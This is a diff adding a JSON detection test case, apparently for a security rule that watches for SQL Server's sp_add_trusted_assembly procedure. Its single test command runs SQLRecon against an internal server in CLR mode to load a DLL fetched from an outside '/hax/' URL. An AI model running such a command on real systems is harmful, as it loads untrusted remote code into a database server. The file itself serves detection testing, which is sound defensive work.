@@ -1,0 +1,20 @@
+{
+    "rule name": "Database - Stored Procedure - sp_add_trusted_assembly",
+    "test attribution": "Seamless Intelligence",
+    "test package": "N/A",
+    "test performed via": "Windows Test Server",
+    "admin level required": "N/A",
+    "test pre-requisites": "N/A",
+    "error_reason": "N/A",
+    "tests": [
+        "See auto-test"
+    ],
+    "test description": "N/A",
+    "automated testing": {
+        "test mechanism": "cmd.exe",
+        "test command": "SQLRecon.exe -a Windows -s 192.168.3.22 -m clr -o https://www.seamlessintelligence.com.au/hax/sql4.dll -f CustomFunctionName",
+        "test args": "N/A",
+        "test pattern": "N/A",
+        "sql pattern": "N/A"
+    }
+}
